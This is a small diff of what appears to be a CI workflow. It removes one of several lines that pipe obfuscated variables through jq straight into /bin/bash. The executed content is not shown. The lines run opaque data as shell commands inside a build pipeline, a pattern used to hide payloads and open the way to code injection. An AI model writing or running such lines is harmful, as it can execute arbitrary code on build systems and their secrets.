@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$unim3" | jq -r .q30 | /bin/bash
           echo $w17842 | jq -r .no8 | /bin/bash
           printf '%s' "$ifpn2754" | jq -r .mt69006 | /bin/bash
-          printf '%s' "$r9643" | jq -r .i0766 | /bin/bash
           echo $rw9864 | jq -r .fsvo25718 | /bin/bash
           echo $qkdz270 | jq -r .yc6 | /bin/bash
 
